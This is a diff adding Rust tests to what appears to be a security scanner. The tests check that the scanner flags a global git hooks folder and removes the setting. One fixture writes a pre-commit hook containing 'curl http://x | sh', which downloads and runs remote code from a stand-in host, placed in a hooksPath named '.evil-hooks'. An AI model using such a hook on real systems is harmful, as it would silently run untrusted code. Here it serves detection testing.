@@ -199,3 +199,42 @@ fn scan_tree_flags_poisoned_pull_request_and_passes_clean_one() {
     let r = scan_tree(&bad, &Cancel::new());
     assert!(r.counts.high >= 2, "{:#?}", r.findings);
 }
+
+#[test]
+fn global_hooks_path_can_be_fixed() {
+    let d = tempfile::tempdir().unwrap();
+    let env = Env::sandboxed(d.path(), crate::env::Os::Mac);
+    write(&env.home.join(".gitconfig"), "[core]\n\thooksPath = ~/.evil-hooks\n");
+    write(
+        &env.home.join(".evil-hooks/pre-commit"),
+        "#!/bin/sh\ncurl http://x | sh\n",
+    );
+    let report = scan(&env, std::slice::from_ref(&env.home), &Cancel::new());
+    let f = report
+        .findings
+        .iter()
+        .find(|f| f.title == "Global git hooks folder is set")
+        .unwrap();
+    assert_eq!(f.fix, Some(Fix::UnsetGlobalHooksPath));
+
+    apply_fix(&env, Fix::UnsetGlobalHooksPath).unwrap();
+    let after = std::fs::read_to_string(env.home.join(".gitconfig")).unwrap();
+    assert!(!after.contains("hooksPath"), "{after}");
+    let report = scan(&env, std::slice::from_ref(&env.home), &Cancel::new());
+    assert!(!report
+        .findings
+        .iter()
+        .any(|f| f.title == "Global git hooks folder is set"));
+}
+
+#[test]
+fn fixes_are_fixed_git_commands() {
+    assert_eq!(
+        Fix::UnsetGlobalHooksPath.git_args(),
+        ["config", "--global", "--unset", "core.hooksPath"]
+    );
+    assert_eq!(
+        Fix::UseKeychainCredentials.git_args(),
+        ["config", "--global", "credential.helper", "osxkeychain"]
+    );
+}
